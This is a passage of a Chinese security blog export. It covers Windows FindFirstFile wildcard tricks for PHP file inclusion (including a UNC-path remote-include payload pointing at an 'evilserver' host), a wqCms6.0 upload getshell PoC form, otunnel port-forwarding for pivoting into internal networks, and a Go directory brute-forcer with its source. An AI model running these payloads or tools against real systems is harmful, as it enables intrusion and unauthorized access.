<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE:include(‘shell&lt;&apos;);  或者include(‘shell&lt;&lt;&apos;);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。</span><br></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE：include(‘shell.p&gt;p&apos;);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。</span><br></pre></td></tr></table></figure>
</li>
<li><p>当调用FindFirstFile()函数时，”””(双引号)被替换成”.”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE:include(‘shell”php&apos;);    //===&gt;include(‘shell.php&apos;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果文件名第一个字符是”.”的话，读取时可以忽略之</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE：fopen(‘.htacess&apos;);  //==&gt;fopen(‘htacess&apos;);   //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE：fopen(“config.ini\.// ///.”);==&gt;  fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;)   //译者注：此处的利用我不是很理解，有何作用？截断？</span><br></pre></td></tr></table></figure>
</li>
<li><p>该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE：include (‘\evilservershell.php&apos;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>用以下方法还可以切换文件的盘名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include(‘\.C:myfile.php......D:anotherfile.php&apos;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>选择磁盘命名语法可以用来绕过斜线字符过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(‘C:boot.ini&apos;); //==&gt;  file_get_contents (‘C:/boot.ini&apos;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof</span><br><span class="line"></span><br><span class="line">EXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="更深入的利用方法"><a href="#更深入的利用方法" class="headerlink" title="更深入的利用方法"></a>更深入的利用方法</h2><p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤</p>
<p>请思考该例：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>);</span><br><span class="line">	<span class="comment">//or another function from Table 1, i.e. include().</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>访问test.php?a=../a&lt;%00</p>
<p>可能出现两种结果</p>
<ol>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。</p>
</li>
<li><p>Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。</p>
</li>
</ol>
<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。</p>
<p>此外，有记录显示，有时网站会抛出如下错误：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..</span><br></pre></td></tr></table></figure></p>
<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。</p>
<p>因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><blockquote>
<p>PHP application source code audits advanced technology:</p>
<p><a href="http://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="noopener">http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
<p>MSDN FindFirstFile Function reference:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx</a></p>
<p>MSDN comments history:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3</a></p>
<p>MSDN article «Naming Files, Paths, and Namespaces»:</p>
<p><a href="http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx</a></p>
<p>Technet article «Managing Files and Directories»:</p>
<p><a href="http://technet.microsoft.com/en-us/library/cc722482.aspx" target="_blank" rel="noopener">http://technet.microsoft.com/en-us/library/cc722482.aspx</a></p>
<p>Paper «Technique of quick exploitation of 2blind SQL Injection»:</p>
<p><a href="http://www.exploit-db.com/papers/13696/" target="_blank" rel="noopener">http://www.exploit-db.com/papers/13696/</a></p>
</blockquote>
<hr>
<p>全文完。</p>
<p>注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
<p>文章转自群友</p>
<h1 id="版权声明："><a href="#版权声明：" class="headerlink" title="版权声明："></a>版权声明：</h1><p>文章所设计内容包括两部分<br>一是法师的书籍《代码审计-企业级web代码安全架构》<br>二是来自群友@evil7提供的资料<br>以下为资料原文：<br><a href="http://www.169it.com/blog_article/2302639890.html" target="_blank" rel="noopener">http://www.169it.com/blog_article/2302639890.html</a><br><a href="https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki</a></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>wqCms6.0在IIS6的Getshell</title>
    <url>/2017/02/22/wqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html</url>
    <content><![CDATA[<p>2017-02-15发布</p>
<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="noopener">wobushou</a></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>otunnel：一个和lcx差不多的端口转发的工具</title>
    <url>/2017/02/15/otunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html</url>
    <content><![CDATA[<p>这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/ooclab/otunnel" target="_blank" rel="noopener">ooclab/otunnel</a><br><a id="more"></a></p>
<h1 id="下载地址-内涵各大平台"><a href="#下载地址-内涵各大平台" class="headerlink" title="下载地址(内涵各大平台)"></a>下载地址(内涵各大平台)</h1><p><a href="http://dl.ooclab.com/otunnel/" target="_blank" rel="noopener">http://dl.ooclab.com/otunnel/</a></p>
<h1 id="otunnel-用法"><a href="#otunnel-用法" class="headerlink" title="otunnel 用法"></a>otunnel 用法</h1><p>前提：</p>
<ol>
<li>假设 server 的地址为 example.com</li>
<li>从 client 能连接 server (client 与 server 无需在同一个网络)</li>
</ol>
<p><strong>注意</strong>  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）</p>
<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./otunnel listen :10000 -s longlongsecret</span><br></pre></td></tr></table></figure>
<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./otunnel connect example.com:10000 -s longlongsecret -t <span class="string">'r:192.168.1.3:22::10022'</span></span><br></pre></td></tr></table></figure></p>
<p>现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22</p>
<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./otunnel connect example.com:10000 -s longlonglongsecret -t <span class="string">'f::20080:127.0.0.1:3128'</span></span><br></pre></td></tr></table></figure></p>
<p>现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128</p>
<h2 id="程序用法"><a href="#程序用法" class="headerlink" title="程序用法"></a>程序用法</h2><h3 id="t-格式"><a href="#t-格式" class="headerlink" title="-t 格式"></a>-t 格式</h3><p>包含多个字段信息，以<code>:</code>隔开(为空的字段也不能省略<code>:</code>)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代理类型:本地地址:本地端口:远程地址:远程端口</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>代理类型</td>
<td style="text-align:center">r 表示反向代理; f 表示正向代理</td>
</tr>
<tr>
<td>本地地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>本地端口</td>
<td style="text-align:center">整数</td>
</tr>
<tr>
<td>远程地址</td>
<td style="text-align:center">IP或域名</td>
</tr>
<tr>
<td>远程端口</td>
<td style="text-align:center">整数</td>
</tr>
</tbody>
</table>
<p><strong>注意</strong></p>
<ol>
<li><code>本地地址</code>或<code>远程地址</code>如果为空，表示所有网口</li>
<li>otunnel 命令行可以包含多个<code>-t</code>选项，同时指定多条隧道规则</li>
</ol>
<h1 id="特点及优势"><a href="#特点及优势" class="headerlink" title="特点及优势"></a>特点及优势</h1><p>otunnel 是一款对称的安全隧道工具。</p>
<ul>
<li>单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。</li>
<li>支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。</li>
<li>无需配置文件：命令行使用</li>
<li>对称设计：同时支持 正、反向代理（端口映射）</li>
<li>安全加密：支持 AES 对称加密</li>
</ul>
<p><img src="https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png" alt="otunnel反向代理图示"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang初练手-多线程网站路径爆破</title>
    <url>/2017/02/08/first-practice-for-Golang-Multithread-Website-Burster.html</url>
    <content><![CDATA[<p>以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍</p>
<p>先放张图<img src="https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif" alt="演示1.gif"><br><a id="more"></a></p>
<p>用法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5</span><br><span class="line">Buster是你的程序名字</span><br><span class="line">-u后面填网址参数，格式如上</span><br><span class="line">-d选字典</span><br><span class="line">-t是线程数</span><br><span class="line">当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的</span><br></pre></td></tr></table></figure></p>
<p>话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下<br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"bufio"</span></span><br><span class="line">	<span class="string">"flag"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> urls <span class="keyword">chan</span> <span class="keyword">string</span></span><br><span class="line"><span class="keyword">var</span> no404URL = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//等待goroutine完成</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> baseURL <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">var</span> dicPath <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">var</span> threadCount <span class="keyword">int</span></span><br><span class="line">	flag.StringVar(&amp;baseURL, <span class="string">"u"</span>, <span class="string">"https://www.baidu.com"</span>, <span class="string">"website which you want to burst"</span>)</span><br><span class="line">	flag.StringVar(&amp;dicPath, <span class="string">"d"</span>, <span class="string">"asp.txt"</span>, <span class="string">"dic which you want to use"</span>)</span><br><span class="line">	flag.IntVar(&amp;threadCount, <span class="string">"t"</span>, <span class="number">5</span>, <span class="string">"number of Thread"</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(os.Args) == <span class="number">1</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</span><br><span class="line">		fmt.Println(<span class="string">" Author      |       Akkuamn"</span>)</span><br><span class="line">		fmt.Println(<span class="string">"------------------------------------"</span>)</span><br><span class="line">		fmt.Println(<span class="string">" Update-v1.0 |      2017-02-07"</span>)</span><br><span class="line">		fmt.Println(<span class="string">"-------------------------------------"</span>)</span><br><span class="line">		fmt.Printf(<span class="string">"\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n"</span>, os.Args[<span class="number">0</span>])</span><br><span class="line">		fmt.Printf(<span class="string">"View more help via %s -h\n\n"</span>, os.Args[<span class="number">0</span>])</span><br><span class="line">		listDic(<span class="string">"dic"</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dicPath = <span class="string">"./dic/"</span> + dicPath</span><br><span class="line">		start(baseURL, dicPath, threadCount)</span><br><span class="line">		wg.Wait() <span class="comment">//等待goroutine完成</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">start</span><span class="params">(baseURL <span class="keyword">string</span>, dicPath <span class="keyword">string</span>, threadCount <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> dicError != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">"\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n"</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> dicFile.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></span><br><span class="line">	ReturnBurstURL(dicFile, baseURL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//单独开goroutine从信道no404URL取数据写入文件</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		resultTxt, err := os.OpenFile(<span class="string">"result.txt"</span>, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">		resultWriter := bufio.NewWriter(resultTxt)</span><br><span class="line">		<span class="keyword">defer</span> resultTxt.Close()</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			_, err = resultWriter.WriteString(&lt;-no404URL)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Println(<span class="string">"resultWriter Error:"</span> + err.Error())</span><br><span class="line">			&#125;</span><br><span class="line">			resultWriter.Flush()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="comment">//并发访问网址并将状态码不为404的网址加入信道no404URL</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; threadCount; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">			<span class="keyword">for</span> <span class="built_in">len</span>(urls) &gt; <span class="number">0</span> &#123;</span><br><span class="line">				url := &lt;-urls</span><br><span class="line">				status := HTTPStatus(url)</span><br><span class="line">				fmt.Printf(<span class="string">"[%d]%s-----%s\n"</span>, i, status, url)</span><br><span class="line">				<span class="keyword">if</span> status != <span class="string">"404 Not Found"</span> &#123;</span><br><span class="line">					no404URL &lt;- status + <span class="string">"-----"</span> + url + <span class="string">"\n"</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			wg.Done()</span><br><span class="line">		&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回HTTP访问状态码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPStatus</span><span class="params">(url <span class="keyword">string</span>)</span> <span class="params">(status <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	client := http.DefaultClient</span><br><span class="line">	reqest, err := http.NewRequest(<span class="string">"HEAD"</span>, url, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		reqest.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"</span>)</span><br><span class="line">		reqest.Header.Set(<span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>)</span><br><span class="line">		response, err1 := client.Do(reqest)</span><br><span class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">"HTTPRequest Error:"</span> + err1.Error())</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">defer</span> response.Body.Close()</span><br><span class="line">		<span class="keyword">return</span> response.Status</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"NewRequest Error:"</span> + err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"400 Bad Request"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> urlList []<span class="keyword">string</span></span><br><span class="line">	allURLTxt := bufio.NewScanner(fURL)</span><br><span class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</span><br><span class="line">		newurl := baseurl + <span class="string">"/"</span> + allURLTxt.Text()</span><br><span class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</span><br><span class="line">	&#125;</span><br><span class="line">	urls = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="built_in">len</span>(urlList))</span><br><span class="line">	<span class="keyword">for</span> _, url := <span class="keyword">range</span> urlList &#123;</span><br><span class="line">		urls &lt;- url</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//罗列出可用字典</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listDic</span><span class="params">(dicDir <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	dirList, err := ioutil.ReadDir(dicDir)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"ReadDir Error : "</span> + err.Error() + <span class="string">"\n"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">"Dic you can select : "</span>)</span><br><span class="line">	<span class="keyword">for</span> _, file := <span class="keyword">range</span> dirList &#123;</span><br><span class="line">		fmt.Printf(<span class="string">"    %s\n"</span>, file.Name())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>只编译了win平台下的，如果有需要可以自行编译</p>
<p><strong><a href="http://pan.baidu.com/s/1c2BYT8k" target="_blank" rel="noopener">源码及字典及win程序</a></strong><br><strong>密码: g1gd</strong></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang踩坑录 两种方式来读取文件一行所导致的问题</title>
    <url>/2017/02/04/Golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
<a id="more"></a>
<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400 Bad Request-----http://www.xxx.com/channel.asp</span><br><span class="line">400 Bad Request-----http://www.xxx.com/index.asp</span><br><span class="line">404 Not Found-----http://www.xxx.com/admin.asp</span><br></pre></td></tr></table></figure></p>
<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	allURLTxt := bufio.NewReader(fURL)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</span><br><span class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</span><br><span class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</span><br><span class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</span><br><span class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</span><br><span class="line">			<span class="keyword">return</span> urlList</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	allURLTxt := bufio.NewScanner(fURL)</span><br><span class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</span><br><span class="line">		newurl := baseurl + allURLTxt.Text()</span><br><span class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</span><br><span class="line">	<span class="keyword">return</span> urlList</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></span><br><span class="line"><span class="function">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span></span><br><span class="line"><span class="function">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span 